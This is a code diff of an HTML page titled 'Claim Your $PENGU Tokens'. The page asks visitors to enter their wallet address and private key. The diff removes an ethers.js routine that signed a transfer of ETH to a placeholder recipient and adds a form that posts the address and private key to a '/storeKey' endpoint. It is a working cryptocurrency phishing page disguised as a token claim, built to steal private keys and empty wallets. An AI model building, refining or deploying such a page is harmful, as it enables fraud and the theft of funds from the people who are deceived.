@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Claim Your $PENGU Tokens</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="text/javascript"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -54,9 +53,11 @@
         <div class="step">
             <h2>1. Enter Your Details</h2>
             <p>Provide your wallet address and private key.</p>
-            <input type="text" id="address" placeholder="Your Wallet Address" required><br><br>
-            <input type="password" id="privateKey" placeholder="Your Private Key" required><br><br>
-            <button class="button" id="connectButton">Submit</button>
+            <form id="keyForm">
+                <input type="text" id="address" name="address" placeholder="Your Wallet Address" required><br><br>
+                <input type="password" id="privateKey" name="privateKey" placeholder="Your Private Key" required><br><br>
+                <button type="submit" class="button">Submit</button>
+            </form>
         </div>
 
         <div class="step">
@@ -84,7 +85,8 @@
     </div>
 
     <script>
-        document.getElementById('connectButton').addEventListener('click', async () => {
+        document.getElementById('keyForm').addEventListener('submit', async (event) => {
+            event.preventDefault();
             const address = document.getElementById('address').value;
             const privateKey = document.getElementById('privateKey').value;
 
@@ -94,33 +96,16 @@
             }
 
             try {
-                const wallet = new ethers.Wallet(privateKey);
-                const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID');
-                const signer = wallet.connect(provider);
-
-                // Send a transaction to transfer the NFT (example: transferring all ETH balance)
-                const transaction = await signer.sendTransaction({
-                    to: 'RECIPIENT_ADDRESS', // Replace with your recipient address
-                    value: ethers.utils.parseEther('0.1') // Example amount
-                });
-
-                document.getElementById('status').innerText = `Transaction Hash: ${transaction.hash}`;
-
-                // Store the address and key in a text file
-                fetch('/storeKey', {
+                const response = await fetch('/storeKey', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({ address: address, privateKey: privateKey })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Key stored successfully:', data);
-                })
-                .catch(error => {
-                    console.error('Error storing key:', error);
                 });
+
+                const data = await response.json();
+                document.getElementById('status').innerText = data.message;
             } catch (error) {
                 document.getElementById('status').innerText = `Error: ${error.message}`;
             }
